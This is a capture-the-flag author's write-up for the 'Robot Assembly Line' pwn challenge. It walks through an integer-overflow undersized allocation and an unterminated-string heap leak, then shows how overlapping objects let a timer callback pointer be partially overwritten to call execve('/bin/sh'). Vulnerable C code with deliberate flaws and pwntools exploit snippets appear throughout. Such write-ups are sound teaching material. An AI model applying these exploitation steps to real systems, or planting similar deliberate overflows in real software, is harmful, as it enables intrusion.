# [PWN Medium-Hard] Robot Assembly Line: 7 solves

## Overview

The goal when designing this challenge was to try to create a somewhat realistic
exploitation challenge, requiring the chaining of a few different vulnerabilities
and tricks. There are only two actual vulnerabilities:

1. Integer overflow when calculating allocation size for robots array
2. Failure to ensure NUL-terminated string when reading robot name


## Stage 1: Using the integer overflow to cause a too-small allocation

The first vulnerability allows allocating a too-small buffer for the array of robots:

```c
locked_printf("Enter number of robot turrets to manufacture:\n");
if (!read_line(g_line, sizeof(g_line), STDIN_FILENO)) {
    return -1;
}

size_t count;
if (sscanf(g_line, "%zu", &count) != 1) {
    return -1;
}

// Intentional 64-bit integer overflow resulting in too-small allocation
size_t size = round_up(count * sizeof(Robot), sizeof(Robot));
// locked_printf("DEBUG: Requested allocation size: %zu\n", size);
Robot* robots = malloc(size);
memset(robots, 0, size);
```

My exploit calculates a value that will integer overflow back to 1, thus only allocating
space for a single `Robot`. This will become critically important later.

```python
# Calculate number of robots to correctly overflow
ovf_size = (1 << 64) // SIZEOF_ROBOT + 1
product_size = ovf_size * SIZEOF_ROBOT

# Sanity checking
assert product_size >= (1 << 64)
assert wrap64(product_size) <= SIZEOF_ROBOT

r.recvuntil(b"Enter number of robot turrets to manufacture:\n")
r.sendline(str(ovf_size).encode())
```

_Side note: directly after allocating the robots array, there is a dummy allocation of a_
_carefully selected size to ensure overlapping objects will align in a particular way:_

```c
// Allocate slot so robots line up with timers.
// Timer size is 0x20, plus 0x10 for metadata
// Robot size is 0x30, including intentionally added padding
g_slot = malloc(0x10);
```


## Stage 2: Leaking a heap address

We also need to figure out how to leak a heap address. By creating a robot whose name
fills the name buffer and doesn't contain any NUL bytes, data after the robot's name can
be leaked out:

```c
locked_printf("Initializing turret #%zu. Name?\n", num);
if (!read_line(robot->name, sizeof(robot->name), STDIN_FILENO)) {
    return -1;
}

//...

locked_printf("%s: \"%s\"\n", robot->name, random_hello_message());
```

Here's what `struct Robot` looks like:

```c
typedef struct {
	/* 00 + 0A */ char name[10];
	/* 0A + 01 */ bool is_self_aware;
	/* 0B + 01 */ bool is_evil;
	/* 0C + 04 */ unsigned iq;
	/* 10 + 10 */ char _padding[0x20];
} Robot; /* sizeof = 0x30, malloc size (for 1): 0x40 */
```

Assuming that `name` is full and has no NUL bytes, it'll try to then print out the next
fields in this struct as an ASCII string. Since our goal is to leak the `_padding` bytes,
we must also ensure that the remaining fields (`is_self_aware`, `is_evil`, and `iq`) all
are free from NUL bytes. The first two are easy, just set them to `true`. For the `iq`, it must be over 16777215 (`0xffffff`). I chose to directly set it to 4 ASCII bytes in my
exploit for fun.

Now that we can leak the `_padding` bytes at the end of the `Robot` struct, will we just
automatically get heap pointers out of it? Well, no. While the allocation is immediately
`memset()` to zero, this isn't a concern (since the allocation is really small and thus
only the first `Robot` will be zeroed). The problem is that we aren't lucky enough for the
heap to be dirty and already have pointers for us to leak. We must prepare the heap to put
a heap pointer in the right place before triggering the leak.

To do this, it's important to understand how the [timer system](timers.c#L200) works
(used for the robots' self-destruct timers). A separate thread is created for keeping track
of timers. When a new timer is allocated, the expiry time is calculated by adding the timer's
duration to the current time. This expiry time is then used as a sort key to determine where
in the global linked-list of timers to insert the new timer. Here's `struct timer`:

```c
struct timer {
	/* 00 + 08 */ void *cb_arg;
	/* 08 + 08 */ void (*callback)(void *, void *, void *);
	/* 10 + 08 */ struct slist_node node;
	/* 18 + 10 */ struct timespec expiry;
}; /* sizeof = 0x28, malloc size: 0x30 */
```

The linked list is tracked using the `struct slist_node node` field, where this type is:

```c
struct slist_node {
    struct slist_node *next;
};
```

This defines a singly linked list in a style inspired by the Linux kernel, where structs
that wish to be added to lists must contain a "list node" field. The list node field points
to the list node field of the neighboring connected linked list node(s). These pointers then
don't point to the beginning of a `struct timer`, but rather to the `struct slist_node node`
field within the `struct timer`. Also important is that the final node in the linked list
has its `node.next` field set to `NULL`. Finally, as soon as a timer expires and its callback
function returns, the timer object will be freed.

As you interact with the program and start creating robots, any robots created after the
first will be in unallocated space. They will end up overlapping with the timer objects.
Due to intentional alignment of the heap, the `Robot` and `struct timer` objects will
always overlap cleanly starting with their first byte. This means that the `_padding` field
we can leak from a `Robot` overlaps with the `struct slist_node node` field of a timer object.
_Side note: It also overlaps with the internal heap metadata that will come between timer_
_objects, which was an intentional decision to discourage heap metadata exploits_. Therefore, as long as a timer object is NOT the last in the linked list and overlaps with a `Robot`,
leaking from the robot's name will leak a heap pointer (the address of the next linked list
node, meaning the timer that expires directly after the current one).

To make this leak happen, here's what the heap layout will look like. Note that I refer to
the first robot as `R1`, and its matching timer is named `T1`. Internal heap metadata is
shown as an `X`, and overlapping objects are above/below.

```
                (next) _________
                      /         \
+----+-+--------+-+--/------+-+--v-+-----
| R1 |X| g_slot |X| T1      |X| T2 | ...
+----+-+--------+-+---------+-+----+-----
     | R2         | R3 (leak) | ...
     +------------+-----------+-----
```

And here's the relevant exploit code:

```python
# R1: long timer and name "/bin/sh" for later
info("R1: /bin/sh and prep for heap leak")
build_robot(r, b"/bin/sh", 1337, False, False, 95 * SECS)

# R2: longER timer. Must expire after T1 so T1->next is a heap
#     pointer, not NULL
info("R2: prepare heap pointer to leak")
build_robot(r, b"nonnull", 2, False, False, 96 * SECS)

# R3: no NUL bytes, will leak heap addr.
#     small timer, as it's also the corruption target
info("R3: heap leak")
heap_leak = build_robot(r, b"0123456789", u32(b"ABCD"), True, True, 1 * SECS)
heap_leak = heap_leak[0x10:]
info(f'Leak: {repr(heap_leak)}')

# Leaks T1->next, which will be &T2->node
obj_addr = u64(heap_leak.ljust(8, b'\0'))
```

As mentioned in the comment, the address leaked will be `&T2->node`. Therefore, to get the
address of the `"/bin/sh"` string we stuffed into `R1->name`, we do this:

```python
# addr - 0x10 does container_of()
# then, - 0x90 to go from R4 to R1
binsh_addr = obj_addr - 0x10 - 0x90
info(f'/bin/sh addr: {binsh_addr:#x}')
```


## Stage 3: Gaining (partial) control of RIP

Now that we know where the heap is, we can move on to our final goal of corrupting one of
the overlapping timer objects. The obvious corruption target is the `callback` function
pointer. If we corrupt this field in a timer that has not yet expired, we will gain control
of RIP after waiting for that timer to expire. Here's the relevant code from the timer
system for executing the callback function:

```c
struct timer *cur = /* ... */;

//...

/* Hack to make it easy to replace with execve() */
cur->callback(cur->cb_arg, NULL, NULL);
// locked_printf("DEBUG: free timer %p\n", cur);
free(cur);
```

To prepare the overlap to allow corruption, we created T3 with a short timer duration (1s).
We create a dummy robot (R4), which overlaps with T2. The `name` of R5 overlaps with the
timer object T3 (with the short duration), starting with the `cb_arg` field and then
continuing to the first two bytes of the `callback` function pointer.

```
+----+-+--------+-+---------+-+----+-+-------------+-+----+-+----+
| R1 |X| g_slot |X| T1      |X| T2 |X| T3          |X| T4 |X| T5 |
+----+-+--------+-+---------+-+----+-+-------------+-+----+-+----+
     | R2         | R3 (leak) | R4   | R5 (corrupt)  |
     +------------+-----------+------+---------------+
```


## Stage 4: Using partial RIP control to get a shell

Our goal is to replace the `callback` function pointer effectively with the address of
`execve()`. Therefore, we will call `execve(timer->cb_arg, NULL, NULL)`. The first argument
to `execve()` is the path of the program to execute, and therefore we start the robot's name
with the absolute address of R1's name (which is where we stuffed the `"/bin/sh\0"` string
earlier and the address we computed from the leaked heap address earlier). Now, we only
can control the next two bytes, which are the first two bytes of the `callback` function
pointer. We don't know where the main executable lives in memory due to ASLR. However, this
is not very important, as due to little endian byte ordering, we are able to do a partial
overwrite of the `callback` function pointer that allows us to move it within a relative
64 KiB window (meaning that if `callback` previously pointed to `0xabcdef2468`, we can
replace the lower `0x2468` part with whatever we want). ASLR does come into play though,
as it is applied at a granularity of page level (`0x1000` for most Linux operating systems).
If we know the timer callback function pointer is normally at `0xabcdef2468` and we want to
change it to `0xabcdef1337`, we can write the bytes `\x37\x13`. ASLR might mean that our
target is actually located at `0xfedcba9337`. By writing the bytes mentioned before, we will
get the wrong address. However, there is a 1/16 (6.25%) chance that we get the top nybble
(page number) correct. This is more than good enough for a CTF challenge, as we can run our
exploit script until we get lucky.

Knowing this, we can try to move the function pointer within a 64 KiB region. Normally, this
function pointer will point to a function within the main binary, `robot_self_destruct()`.
Trying to point directly to `execve()` in libc won't work, as it's probably very far away in
memory. However, the source code contains this helpful function:

```c
static void wat(void)
{
	if (rand() < 0) {
		execve((void*)1, (void*)2, (void*)3);
	}
}
```

This function isn't directly useful as a corruption target, as it passes nonsensical values
to `execve()`. Rather, it is useful as it contains a call to `execve()`, which will add a
PLT entry for `execve()` in our program's main binary. The PLT entry of `execve()` is very
likely to be close enough to the `robot_self_destruct()` function to fall within that 64 KiB
window.

Here is the final exploit snippet for this stage:

```python
# R4: doesn't matter, just need to get to R5
info("R4: alignment")
build_robot(r, b"align", 4, False, False, 99 * SECS)

# R5: payload name, only partial send
execve_plt = exe.plt["execve"]
name = p64(binsh_addr)
name += p16(execve_plt & 0xffff)
info(f'R5: corrupt callback to execve.plt = {exe.plt["execve"]:#x}')
r.recvuntil(b"Name?\n")
r.send(name)

# Just wait for the timer to trigger
warn("Waiting for corrupted timer callback! This has a 6.25% success rate...")
r.interactive()
```

See my [exploit](solve.py) for the full solution used to validate this challenge.